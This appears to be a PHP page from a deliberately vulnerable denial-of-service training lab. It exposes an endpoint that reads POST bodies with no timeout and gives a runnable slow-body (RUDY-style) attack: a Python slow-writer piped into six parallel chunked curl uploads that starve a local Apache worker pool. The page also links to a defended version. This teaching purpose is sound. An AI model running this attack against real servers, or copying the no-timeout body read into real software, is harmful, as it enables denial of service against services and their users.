<?php
require __DIR__ . '/shared/layout.php';

/*
 * VULNERABLE: slow-body target. The endpoint advertises that it accepts a
 * POST body, then calls file_get_contents('php://input') with no timeout.
 *
 * Apache mpm_prefork in this lab is configured with MaxRequestWorkers=6 and
 * Timeout=60s. A handful of `curl --limit-rate 100` clients are enough to
 * tie up the entire worker pool. Other requests then queue or 503 until the
 * slow clients finish or hit the global timeout.
 *
 * Run `docker exec dos-basic apache2ctl status` from another terminal to see
 * the worker states (W = writing reply, R = reading request).
 */

$result = null;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $t0 = microtime(true);
    $body = file_get_contents('php://input');
    $elapsed_ms = (microtime(true) - $t0) * 1000;

    $result = [
        'bytes_received' => strlen($body),
        'elapsed_ms' => round($elapsed_ms, 2),
        'worker_pid' => getmypid(),
    ];
}

layout_open('slow body');
?>
<h1>/slow.php — vulnerable to slow-body / RUDY-style attacks</h1>
<p><small class="note">Reads the full POST body inline. No body-read timeout at the PHP layer; Apache's default Timeout (60s) is the only guard.</small></p>

<h2>Try it</h2>
<p>Curl's <code>--limit-rate</code> slows both directions, which obscures the result. Use a slow stdin source piped into chunked transfer encoding:</p>

<pre>cat &gt; /tmp/slowpipe.py &lt;&lt;'EOF'
import sys, time
n = int(sys.argv[1]); rate = int(sys.argv[2])
chunk = max(1, rate // 10); delay = chunk / rate
written = 0
while written &lt; n:
    w = min(chunk, n - written)
    sys.stdout.buffer.write(b'a' * w); sys.stdout.buffer.flush()
    written += w; time.sleep(delay)
EOF

# Six slow uploaders in parallel (the lab has 6 Apache workers).
for i in 1 2 3 4 5 6; do
  ( python3 /tmp/slowpipe.py 3000 50 | curl -sS --max-time 120 -X POST \
      -H 'Content-Type: application/octet-stream' \
      -H 'Transfer-Encoding: chunked' -H 'Expect:' --no-buffer -T - \
      http://localhost:8092/slow.php -o /dev/null ) &amp;
done
sleep 8

docker exec dos-basic curl -sS http://127.0.0.1/server-status?auto \
    | grep -E '^(BusyWorkers|IdleWorkers|Scoreboard)'

# A normal request hangs while workers are starved.
time curl -sS http://localhost:8092/ -o /dev/null</pre>

<?php if ($result): ?>
    <h2>Result</h2>
    <pre><?= h(json_encode($result, JSON_PRETTY_PRINT)) ?></pre>
<?php endif; ?>

<p>Compare to <a href="/defended/slow.php">/defended/slow.php</a>, which enforces a per-connection body-read deadline via <code>stream_set_timeout</code> and bails the moment a client stalls.</p>

<?php layout_close();
